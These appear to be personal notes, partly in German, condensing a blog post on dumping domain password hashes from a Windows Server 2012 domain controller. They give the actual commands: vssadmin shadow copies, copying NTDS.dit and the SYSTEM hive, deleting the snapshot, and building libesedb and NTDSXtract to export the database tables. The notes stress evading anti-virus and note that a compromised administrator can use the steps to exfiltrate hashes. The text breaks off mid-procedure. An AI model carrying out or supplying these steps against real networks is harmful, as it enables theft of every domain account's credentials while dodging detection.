#Win 2012 PW Dumping

Summary von http://penturalabs.wordpress.com/2013/05/30/domain-password-audits/

#Challenges
- Anti-Virus technology continuing to block auditing/hacking tools like pwdump/fgdump, ability to audit passwords on a domain is starting to increase in difficultly.
- In a series of recent audits it has been challenging to extract the domain hashes, and upon using familiar common tools like pwdump the Windows Security Accounts Manager (SAM); 
surprisingly only reveals two accounts, where we would expect a long list of domain hashes.
- Since Microsoft Windows 2000, Active Directory has stored credential information within a database engine called Extensible Storage Engine (ESE) based of the Jet database and used by Exchange v5.5 and WINS.
- The default location for this file is %SystemRoot%\ntds\NTDS.DIT; as this file is in use by the domain controller, it is locked and cannot be accessed.
- The problem at hand, is how to safely extract Domain password hashes without triggering Anti-Virus or even some HIDS/HIPS Vendors.  
- This post will cover NTDS password cracking and Volume Shadow Copying in order to capture the hashes.


#VSS to safely get a dump
- Why use VSS… Well first you need administrator privileges to perform the password audit, so you should have the privileges to perform the necessary actions.
- VSS is build into Windows from 2003; as its a legitimate set of commands it does not trigger AntiVirus (with built-in HID/HIPS). 
-Therefore, as an administrator (legitimate or compromised) your typically free to run the following commands, and exfiltrate the password hash database.


#Creating the Shadowcopy of the drive CONTAINING the ntds.dit file (generally C: drive but could be somewhere else if the file is big):
vssadmin create shadow /for=c:

#List
vssadmin list shadows

#Copy the NTDS.dit and SYSTEM files out of the Volume(s):
copy \\?\GLOBALROOT\{device_id}\{device_name}\path_to\ntdis.dit [your destination]
copy \\?\GLOBALROOT\{device_id}\{device_name}\path_to\SYSTEM [your destination]


#ACHUTNG Copy hat nicht funktioniert unter Win 2012 (pfad probleme?)...noob braucht Shadow Copy Client...
Next you will need to install the Shadow Copy Client. Some Windows Server OS's have the client install package in the following path:
If you do not have that package you can download it from Microsoft, here is a link:http://technet.microsoft.com/en-us/windowsserver/bb405951.aspx



#Delete vss snapshot
vssadmin delete shadows



#Extract ntdis.dit
#First download the libesedb libraries from:
http://pkgs.fedoraproject.org/repo/pkgs/libesedb/libesedb-alpha-20120102.tar.gz/198a30c98ca1b3cb46d10a12bef8deaf/libesedb-alpha-20120102.tar.gz
Extract and compile the libesedb libraries:
./configure
make
make install
ldconfig


#Second download the NTDSXtract framework
http://www.ntdsxtract.com/downloads/ntdsxtract/ntdsxtract_v1_0.zip


#After installing the libesedb libraries, extract the database tables from ntds.dit:
homebox# esedbexport -l /tmp/ese.log -t /tmp/ntds.dit /home/rocky/pwextractwin/ntds.dit 
esedbexport 20120102
